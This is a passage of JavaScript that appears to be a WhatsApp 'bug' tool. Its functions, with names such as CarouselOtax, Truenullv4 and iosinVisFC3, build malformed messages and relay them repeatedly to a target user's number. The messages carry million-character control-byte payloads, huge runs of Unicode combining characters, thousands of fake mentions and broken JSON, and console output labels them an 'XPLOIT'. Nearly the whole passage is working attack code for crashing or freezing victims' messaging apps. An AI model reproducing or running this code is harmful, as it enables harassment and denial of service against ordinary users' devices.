          expiration: 0,
          ephemeralSettingTimestamp: "1763822267",
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "UNKNOWN",
            initiatedByMe: true
          }
        },
        location: {
          degreesLatitude: 0,
          degreesLongitude: 0,
          name: longSpam
        }
      }
    };
  };

  const payload = {
    ...buildMetadata(),
    ...buildEvent()
  };

  await sock.relayMessage(
    target,
    payload,
    { participant: { jid: target } }
  );
}

async function OtaxAyunBelovedX(sock, target, mention) {

  let biji2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " ¿Otax Here¿ ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );
 
  const mediaData = [
    {
      ID: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      ID: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ]

  let sequentialIndex = 0
  console.log(chalk.red(`${target} 𝙎𝙚𝙙𝙖𝙣𝙜 𝘿𝙞 𝙀𝙬𝙚 𝙀𝙬𝙚 𝙊𝙡𝙚𝙝 XPLOIT ⸙`))

  const selectedMedia = mediaData[sequentialIndex]
  sequentialIndex = (sequentialIndex + 1) % mediaData.length
  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia

  const contextInfo = {
    participant: target,
    mentionedJid: [
      target,
      ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
    ],
  }

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
          fileSha256: SHA256,
          fileEncSha256: ENCSHA256,
          mediaKey: mkey,
          mimetype: "image/webp",
          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
          fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  }

const msgxay = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "σƭαא ɦαเ", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  }
  const interMsg = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "σƭαא ɦαเ", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  }

  const statusMessages = [stickerMsg, interMsg, msgxay]
 
  
    let content = {
        extendedTextMessage: {
          text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(50000),
          matchedText: "ꦽ".repeat(20000),
          description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
          title: "ꦽ".repeat(20000),
          previewType: "NONE",
          jpegThumbnail:
            "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
          inviteLinkGroupTypeV2: "DEFAULT",
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            participant: target,
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1995 },
                () =>
                  `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ],
            quotedMessage: {
              newsletterAdminInviteMessage: {
                newsletterJid: "otax@newsletter",
                newsletterName:
                  "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
                caption:
                  "⸙ᵒᵗᵃˣнοω αяє γου?¿" +
                  "ꦾ".repeat(60000) +
                  "ោ៝".repeat(60000),
                inviteExpiration: "999999999"
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterName:
                "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
              newsletterJid: "13135550002@newsletter",
              serverId: 1
            }
          }
        }
      };
      
    const xnxxmsg = generateWAMessageFromContent(target, content, {});

  
  let msg = null;
  for (let i = 0; i < 10; i++) {
  await sock.relayMessage("status@broadcast", xnxxmsg.message, {
      messageId: xnxxmsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });  
  
    await sock.relayMessage("status@broadcast", biji2.message, {
      messageId: biji2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });  
   
     for (const content of statusMessages) {
      const msg = generateWAMessageFromContent(target, content, {})
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
              },
            ],
          },
        ],
      })
    }
    if (i < 9) {
    await new Promise(resolve => setTimeout(resolve, 4000));
  }
  }
  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " meki - melar ",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function CarouselOtax(sock, target) {
    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
    for (let i = 0; i < 2; i++) {
    const cards = Array.from({ length: 5 }, () => ({
        body: proto.Message.InteractiveMessage.Body.fromObject({ text: "OTAX" + "ꦽ".repeat(5000), }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "OTAX" + "ꦽ".repeat(5000), }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: "OTAX" + "ꦽ".repeat(5000),
            hasMediaAttachment: true,
            videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "IL4IFl67c8JnsS1g6M7NqU3ZSzwLBB3838ABvJe4KwM=",
                fileLength: "9999999999999999",
                seconds: 9999,
                mediaKey: "SAlpFAh5sHSHzQmgMGAxHcWJCfZPknhEobkQcYYPwvo=",
                height: 9999,
                width: 9999,
                fileEncSha256: "QxhyjqRGrvLDGhJi2yj69x5AnKXXjeQTY3iH2ZoXFqU=",
                directPath: "/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1755691703",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACIASAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAwQCBQEBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAIaZr4ffxlt35+Wxm68MqyQzR1c65OiNLWF2TJHO2GNGAq8BhpcGpiQ65gnDF6Av/8QAJhAAAgIBAwMFAAMAAAAAAAAAAQIAAxESITEEE0EQFCIyURUzQv/aAAgBAQABPwAag5/1EssTAfYZn8jjAxE6mlgPlH6ipPMfrR4EbqHY4gJB43nuCSZqAz4YSpntrIsQEY5iV1JkncQNWrHczuVnwYhpIy2YO2v1IMa8A5aNfgnQuBATccu0Tu0n4naI5tU6kxK6FOdxPbN+bS2nTwQTNDr5ljfpgcg8wZlNrbDEqKBBnmK66s5E7qmWWjPAl135CxJ3PppHbzjxOm/sjM2thmVfUxuZZxLYfT//xAAcEQACAgIDAAAAAAAAAAAAAAAAARARAjESIFH/2gAIAQIBAT8A6Wy2jlNHpjtD1P8A/8QAGREAAwADAAAAAAAAAAAAAAAAAAERICEw/9oACAEDAQE/AIRmysHh/9k=",
                streamingSidecar: "qe+/0dCuz5ZZeOfP3bRc0luBXRiidztd+ojnn29BR9ikfnrh9KFflzh6aRSpHFLATKZL7lZlBhYU43nherrRJw9WUQNWy74Lnr+HudvvivBHpBAYgvx07rDTRHRZmWx7fb1fD7Mv/VQGKRfD3ScRnIO0Nw/0Jflwbf8QUQE3dBvnJ/FD6In3W9tGSdLEBrwsm1/oSZRl8O3xd6dFTauD0Q4TlHj02/pq6888pzY00LvwB9LFKG7VKeIPNi3Szvd1KbyZ3QHm+9TmTxg2ga4s9U5Q"
            },
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            messageParamsJson: "{[",
            messageVersion: 3,
            buttons: [
                {
                    name: "single_select",
                    buttonParamsJson: "",
                },           
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                        "icon": "RIVIEW",
                        "flow_cta": "ꦽ".repeat(10000),
                        "flow_message_version": "3"
                    })
                },     
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                        "icon": "RIVIEW",
                        "flow_cta": "ꦾ".repeat(10000),
                        "flow_message_version": "3"
                    })
                }
            ]
        })
    }));

    const death = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";

    const carousel = generateWAMessageFromContent(
        target, 
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.create({ 
                            text: `§OtaxUdang§\n${"ꦾ".repeat(2000)}:)\n\u0000` + "ꦾ".repeat(5000)
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: "ꦽ".repeat(5000),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({ 
                            hasMediaAttachment: false 
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ 
                            cards: cards 
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                            messageParamsJson: "{[".repeat(10000),
                            messageVersion: 3,
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "",
                                },           
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        "icon": "RIVIEW",
                                        "flow_cta": "ꦽ".repeat(10000),
                                        "flow_message_version": "3"
                                    })
                                },     
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        "icon": "RIVIEW",
                                        "flow_cta": "ꦾ".repeat(10000),
                                        "flow_message_version": "3"
                                    })
                                }
                            ]
                        }),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1900 },
                                    () =>
                                    "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                            remoteJid: "X",
                            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                            stanzaId: "123",
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimestamp: Date.now() + 1814400000
                                },
                                forwardedAiBotMessageInfo: {
                                    botName: "META AI",
                                    botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                    creatorName: "Bot"
                                }
                            }
                        },
                    })
                }
            }
        }, 
        { userJid: target }
    );

    // Pengiriman dengan format yang diminta tanpa mention
    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: carousel.message
        }
    }, { messageId: carousel.key.id });
    }
}

async function Truenullv4(sock, target, ptcp = true) {
  const VidMessage = generateWAMessageFromContent(target, {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "289511",
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "\n",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1743848703",
      contextInfo: {
        isSampled: true,
        participant: target,
        mentionedJid: [
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "target",
        forwardingScore: 100,
        isForwarded: true,
        stanzaId: "123456789ABCDEF",
        quotedMessage: {
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
        },
      },
      streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
      thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
      thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
      thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
      },
    }, 
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    }
  );
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: VidMessage.message,
     },
    }, ptcp ? 
    { 
      messageId: VidMessage.key.id, 
      participant: { jid: target} 
    } : { messageId: VidMessage.key.id }
  );
  
  const payload = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "X", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload.message,
     },
    }, ptcp ? 
    { 
      messageId: payload.key.id, 
      participant: { jid: target} 
    } : { messageId: payload.key.id }
  );
  
  const payload2 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "\n", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "call_permission_message"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload2.message,
     },
    }, ptcp ? 
    { 
      messageId: payload2.key.id, 
      participant: { jid: target} 
    } : { messageId: payload2.key.id }
  );
}

async function InvisHard(target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "INVISHARDER",
                    footerText: "InvisibleHard༑",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "🇷🇺" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await sock.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "InvisHarder" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
        
async function iosinVisFC3(sock, target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/OTAX",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "OTAX",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone, 
            matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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